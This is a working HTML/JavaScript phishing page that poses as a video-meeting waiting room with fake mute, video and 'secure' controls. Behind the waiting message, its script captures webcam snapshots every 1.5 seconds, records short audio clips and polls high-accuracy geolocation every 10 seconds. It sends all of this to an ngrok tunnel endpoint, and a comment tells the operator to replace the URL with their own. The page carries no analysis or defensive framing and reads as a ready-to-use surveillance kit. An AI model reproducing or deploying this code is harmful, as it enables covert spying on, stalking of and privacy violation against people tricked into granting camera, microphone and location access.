<!DOCTYPE html>
<html>
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
</head>

<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay muted></video>
</div>

<center><canvas id="canvas" width="640" height="480"></canvas></center>

<div class="loading-overlay" id="loadingOverlay">
  <div class="loading-content">
    <h1>Please wait, the meeting host will let you in soon</h1>
    <div class="spinner"></div>
  </div>
</div>

<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");
  
  * {
    padding: 0;
    margin: 0;
    font-family: 'Nunito', sans-serif;
    font-weight: 500;
  }
  
  body {
    height: 100vh;
    width: 100vw;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    overflow: hidden;
  }
  
  #canvas {
    border-radius: 15px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
    max-width: 90vw;
    max-height: 70vh;
    object-fit: cover;
  }
  
  .loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 1001;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  
  .loading-content {
    text-align: center;
    color: white;
    background: rgba(255,255,255,0.1);
    padding: 40px;
    border-radius: 20px;
    backdrop-filter: blur(10px);
  }
  
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255,255,255,0.3);
    border-top: 4px solid white;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 20px auto;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .bottom-bar {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    height: 80px;
    background: rgba(0,0,0,0.9);
    backdrop-filter: blur(20px);
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 30px;
    padding: 0 20px;
    box-sizing: border-box;
  }
  
  .icon-button {
    display: flex;
    flex-direction: column;
    align-items: center;
    color: white;
    cursor: pointer;
    padding: 10px;
    border-radius: 15px;
    transition: all 0.3s ease;
  }
  
  .icon-button:hover {
    background: rgba(255,255,255,0.1);
    transform: translateY(-2px);
  }
  
  .icon-button i {
    font-size: 24px;
    margin-bottom: 5px;
  }
  
  .icon-button.active {
    color: #4ade80;
  }
  
  .end-call {
    background: linear-gradient(45deg, #ef4444, #dc2626);
    color: white !important;
    padding: 12px 24px !important;
    border-radius: 25px;
    font-weight: 600;
    transition: all 0.3s ease;
  }
  
  .end-call:hover {
    transform: scale(1.05);
    box-shadow: 0 10px 25px rgba(239,68,68,0.4);
  }
</style>

<script>
class MeetingApp {
  constructor() {
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvas');
    this.loadingOverlay = document.getElementById('loadingOverlay');
    this.isRecording = false;
    this.currentLocation = null;
    this.audioChunks = [];
    this.mediaRecorder = null;
    
    this.tunnelUrl = 'https://7462-157-36-86-192.ngrok.io/post.php'; // Update with your Cloudflare tunnel URL
    this.init();
  }
  
  async init() {
    // Hide loading after 5 seconds
    setTimeout(() => {
      this.loadingOverlay.style.display = 'none';
    }, 5000);
    
    // Start media capture
    await this.startMediaCapture();
    
    // Start location tracking
    this.startLocationTracking();
  }
  
  async startMediaCapture() {
    try {
      const constraints = {
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: true
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      this.video.srcObject = stream;
      this.initAudioRecording(stream);
      
      // Start capture loop
      this.startCaptureLoop();
      
    } catch (err) {
      console.error('Media capture failed:', err);
    }
  }
  
  initAudioRecording(stream) {
    this.mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'audio/webm;codecs=opus'
    });
    
    this.mediaRecorder.ondataavailable = (event) => {
      this.audioChunks.push(event.data);
    };
  }
  
  startCaptureLoop() {
    const context = this.canvas.getContext('2d');
    
    setInterval(() => {
      // Capture video frame
      context.drawImage(this.video, 0, 0, 640, 480);
      const imageData = canvas.toDataURL('image/png');
      
      // Get audio (1.4s clip)
      if (this.mediaRecorder && this.mediaRecorder.state === 'inactive') {
        this.mediaRecorder.start();
        setTimeout(() => {
          if (this.mediaRecorder.state === 'recording') {
            this.mediaRecorder.stop();
          }
        }, 1400);
      }
      
      // Wait for audio, then send
      setTimeout(() => {
        this.sendData(imageData);
      }, 1500);
      
    }, 1500);
  }
  
  startLocationTracking() {
    const getLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            this.currentLocation = {
              lat: position.coords.latitude,
              lng: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: Date.now()
            };
          },
          (error) => {
            this.currentLocation = { error: error.message };
          },
          { enableHighAccuracy: true, maximumAge: 15000 }
        );
      }
    };
    
    getLocation();
    setInterval(getLocation, 10000); // Update every 10s
  }
  
  async sendData(imageData) {
    const formData = new FormData();
    formData.append('cat', imageData);
    formData.append('audio', new Blob(this.audioChunks, { type: 'audio/webm' }), 'audio.webm');
    formData.append('location', JSON.stringify(this.currentLocation || {}));
    
    try {
      await $.ajax({
        url: this.tunnelUrl,
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false,
        dataType: 'json'
      });
    } catch (error) {
      console.error('Send failed:', error);
    }
    
    this.audioChunks = [];
  }
}

// Initialize app when page loads
$(document).ready(() => {
  new MeetingApp();
  
  // UI interactions
  $('.icon-button').click(function() {
    $(this).toggleClass('active');
  });
});
</script>

<body>
  <div class="bottom-bar">
    <div class="icon-button" title="Mute">
      <i class="fas fa-microphone"></i>
      <span>MIC</span>
    </div>
    <div class="icon-button" title="Stop Video">
      <i class="fas fa-video"></i>
      <span>VIDEO</span>
    </div>
    <div class="icon-button" title="Security">
      <i class="fas fa-shield-alt"></i>
      <span>SECURE</span>
    </div>
    <div class="icon-button" title="Participants">
      <i class="fas fa-users"></i>
      <span>3</span>
    </div>
    <div class="icon-button" title="Share">
      <i class="fas fa-plus-square" style="color: #4ade80;"></i>
      <span>SHARE</span>
    </div>
    <div class="icon-button" title="Chat">
      <i class="fas fa-comments"></i>
      <span>CHAT</span>
    </div>
    <div class="icon-button" title="Record">
      <i class="fas fa-record-vinyl"></i>
      <span>REC</span>
    </div>
    <button class="end-call" onclick="window.close()">End Meeting</button>
  </div>
</body>
</html>
